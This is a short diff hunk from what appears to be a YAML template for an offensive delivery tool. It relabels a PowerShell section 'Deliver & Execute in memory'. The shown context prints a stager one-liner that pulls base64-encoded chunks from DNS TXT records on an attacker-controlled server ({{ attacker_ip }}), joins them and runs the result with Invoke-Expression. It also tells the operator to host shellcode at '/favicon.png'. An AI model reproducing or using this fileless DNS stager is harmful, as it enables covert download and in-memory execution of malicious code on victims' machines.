@@ -30,7 +30,7 @@ content: |
   echo "Host your shellcode at \"/favicon.png\""
   echo "$SEP"
   echo "                      -----PowerShell-----                      "
-  echo "Deliver:"
+  echo "Deliver & Execute in memory:"
   echo "Invoke-Expression (([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( ((((0..([int]\$(Resolve-DnsName -Name example.com -Type \"txt\" -Server {{ attacker_ip }} -DnsOnly).Strings[0]))) | % {\$((Resolve-DnsName -Name \$([System.String]\$_+\".cdn.example.com\") -Type txt -Server {{ attacker_ip }} -DnsOnly).Strings)}) -join \"\") ))))"
   echo "$SEP"
   '
